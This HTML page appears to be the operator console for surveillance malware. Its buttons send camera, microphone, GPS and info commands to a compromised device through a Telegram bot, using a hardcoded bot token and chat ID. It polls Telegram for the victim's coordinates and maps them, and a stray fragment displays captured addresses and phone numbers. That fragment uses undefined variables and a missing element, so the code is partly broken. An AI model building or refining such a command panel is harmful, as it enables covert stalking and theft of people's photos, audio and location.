<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>L-M X-TERMINAL V3</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; flex-direction: column; align-items: center; }
        .header { background: #111; width: 100%; padding: 20px; border-bottom: 2px solid #00ff41; text-align: center; box-shadow: 0 0 20px #00ff41; }
        .main-container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; width: 90%; margin-top: 30px; }
        .card { background: rgba(0,255,65,0.05); border: 1px solid #00ff41; padding: 20px; border-radius: 10px; box-shadow: inset 0 0 10px #00ff41; }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 15px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; }
        button:hover { background: #00ff41; color: #000; box-shadow: 0 0 20px #00ff41; }
        #image-feed { grid-column: 1 / -1; display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .log-box { grid-column: 1 / -1; background: #000; border: 1px dashed #00ff41; padding: 10px; height: 100px; overflow-y: scroll; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header"><h1>[ L-M X-TERMINAL SYSTEM ]</h1></div>
    
    <div class="main-container">
        <!-- Controls -->
        <div class="card">
            <h3>SYSTEM OVERRIDE</h3>
            <div class="btn-grid">
                <button onclick="cmd('PHOTO')">📸 AI CAM</button>
                <button onclick="cmd('VOICE')">🎙️ MIC</button>
                <button onclick="cmd('LOCATION')">📍 GPS</button>
                <button onclick="cmd('INFO')">🔍 INFO</button>
            </div>
        </div>

        <!-- System Stats -->
        <div class="card">
            <h3>DEVICE STATUS</h3>
            <p id="battery">Battery: --%</p>
            <p id="gps-text">Coords: Waiting...</p>
            <a id="map-link" href="#" target="_blank" style="color: cyan; display: none;">[ VIEW ON MAP ]</a>
        </div>

        <div class="log-box" id="system-log">> System initialized...</div>
        
        <div id="image-feed"></div>
    </div>

    <script>
        // updateMonitor ඇතුළත දාන්න
if (msg.message && msg.message.text) {
    let txt = msg.message.text;
    
    // ලිපිනය සහ දුරකථන අංකය පෙන්වීම
    if (txt.includes("Address:") || txt.includes("Phone:")) {
        document.getElementById('info-text').innerText += "\n" + txt;
    }
}
        const TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
        const CHAT = '7883989086';

        function cmd(type) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=CMD_${type}`);
            document.getElementById('system-log').innerHTML += `<br>> Executing ${type}...`;
        }

        async function sync() {
            try {
                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-5`);
                const data = await res.json();
                data.result.reverse().forEach(u => {
                    const m = u.message;
                    if(!m) return;
                    if(m.text && m.text.includes("Lat:")) {
                        document.getElementById('gps-text').innerText = m.text;
                        const c = m.text.match(/-?\d+\.\d+/g);
                        if(c) {
                            document.getElementById('map-link').href = `https://www.google.com/maps?q=${c[0]},${c[1]}`;
                            document.getElementById('map-link').style.display = "block";
                        }
                    }
                });
            } catch(e) {}
        }
        setInterval(sync, 5000);
    </script>
</body>
</html>
